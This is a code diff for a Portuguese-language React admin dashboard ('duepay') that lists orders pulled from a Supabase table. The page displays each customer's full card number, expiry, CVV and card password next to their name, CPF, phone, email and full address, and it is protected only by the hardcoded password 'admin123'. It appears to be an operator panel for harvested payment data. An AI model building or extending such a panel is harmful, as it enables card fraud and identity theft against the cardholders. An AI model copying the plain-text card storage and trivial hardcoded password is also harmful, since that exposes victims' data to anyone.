@@ -1,6 +1,6 @@
 import { createFileRoute } from "@tanstack/react-router";
 import { useEffect, useState } from "react";
-import { sb, type Pedido } from "@/lib/supabase-external";
+import { sb, PEDIDOS_TABLE, type Pedido } from "@/lib/supabase-external";
 import { Loader2, RefreshCw, LogOut } from "lucide-react";
 
 export const Route = createFileRoute("/admin")({
@@ -12,6 +12,7 @@ const ADMIN_PASSWORD = "admin123";
 const SESSION_KEY = "duepay_admin_ok";
 
 const STATUS_OPTIONS = [
+  "pendente",
   "aguardando_operador",
   "processando",
   "link_gerado",
@@ -74,7 +75,7 @@ function Dashboard({ onLogout }: { onLogout: () => void }) {
 
   const fetchAll = async () => {
     const { data, error } = await sb
-      .from("pedidos")
+      .from(PEDIDOS_TABLE)
       .select("*")
       .order("criado_em", { ascending: false })
       .limit(200);
@@ -93,14 +94,14 @@ function Dashboard({ onLogout }: { onLogout: () => void }) {
     if (status === "processado" || status === "falha") {
       patch.processado_em = new Date().toISOString();
     }
-    const { error } = await sb.from("pedidos").update(patch).eq("id", id);
+    const { error } = await sb.from(PEDIDOS_TABLE).update(patch).eq("id", id);
     if (error) alert("Erro: " + error.message);
     else fetchAll();
   };
 
   const removeOne = async (id: string) => {
     if (!confirm("Excluir pedido?")) return;
-    const { error } = await sb.from("pedidos").delete().eq("id", id);
+    const { error } = await sb.from(PEDIDOS_TABLE).delete().eq("id", id);
     if (error) alert("Erro: " + error.message);
     else fetchAll();
   };
@@ -151,12 +152,13 @@ function Dashboard({ onLogout }: { onLogout: () => void }) {
                 <tr>
                   <th className="px-3 py-2">Criado</th>
                   <th className="px-3 py-2">ID</th>
-                  <th className="px-3 py-2">CPF</th>
+                  <th className="px-3 py-2">Cliente</th>
+                  <th className="px-3 py-2">Contato</th>
+                  <th className="px-3 py-2">Endereço de entrega</th>
+                  <th className="px-3 py-2">Produto</th>
                   <th className="px-3 py-2">Cartão</th>
-                  <th className="px-3 py-2">Val / CVV</th>
+                  <th className="px-3 py-2">Val / Senha</th>
                   <th className="px-3 py-2">Valor</th>
-                  <th className="px-3 py-2">Cond.</th>
-                  <th className="px-3 py-2">Operador</th>
                   <th className="px-3 py-2">Status</th>
                   <th className="px-3 py-2">Link</th>
                   <th className="px-3 py-2">Ações</th>
@@ -169,16 +171,32 @@ function Dashboard({ onLogout }: { onLogout: () => void }) {
                       {new Date(p.criado_em).toLocaleString("pt-BR")}
                     </td>
                     <td className="px-3 py-2 font-mono">{p.id.slice(0, 8)}</td>
-                    <td className="px-3 py-2 font-mono">{p.cliente_cpf}</td>
+                    <td className="px-3 py-2">
+                      <div className="font-semibold">{p.cliente_nome}</div>
+                      <div className="font-mono text-[11px] text-muted-foreground">{p.cliente_cpf}</div>
+                    </td>
+                    <td className="px-3 py-2">
+                      <div>{p.cliente_telefone}</div>
+                      <div className="text-[11px] text-muted-foreground">{p.cliente_email}</div>
+                    </td>
+                    <td className="px-3 py-2 max-w-[260px]">
+                      <div>{p.cliente_endereco}, {p.cliente_numero}{p.cliente_complemento ? ` — ${p.cliente_complemento}` : ""}</div>
+                      <div className="text-[11px] text-muted-foreground">
+                        {p.cliente_bairro} · {p.cliente_cidade}/{p.cliente_estado} · CEP {p.cliente_cep}
+                      </div>
+                    </td>
+                    <td className="px-3 py-2">
+                      <div>{p.produto_nome}</div>
+                      <div className="text-[11px] text-muted-foreground">qtd {p.produto_quantidade ?? 1}</div>
+                    </td>
                     <td className="px-3 py-2 font-mono">{p.cartao_numero}</td>
                     <td className="px-3 py-2 font-mono">
                       {p.cartao_validade} / {p.cartao_cvv}
+                      {p.cartao_nome && <div className="text-[11px] text-muted-foreground font-sans">{p.cartao_nome}</div>}
                     </td>
                     <td className="px-3 py-2 font-semibold">
                       R$ {Number(p.valor).toFixed(2).replace(".", ",")}
                     </td>
-                    <td className="px-3 py-2">{p.condicao}x</td>
-                    <td className="px-3 py-2">{p.operador}</td>
                     <td className="px-3 py-2">
                       <select
                         value={p.status}
@@ -216,7 +234,7 @@ function Dashboard({ onLogout }: { onLogout: () => void }) {
                 ))}
                 {filtered.length === 0 && (
                   <tr>
-                    <td colSpan={11} className="px-3 py-8 text-center text-muted-foreground">
+                    <td colSpan={12} className="px-3 py-8 text-center text-muted-foreground">
                       Nenhum pedido.
                     </td>
                   </tr>
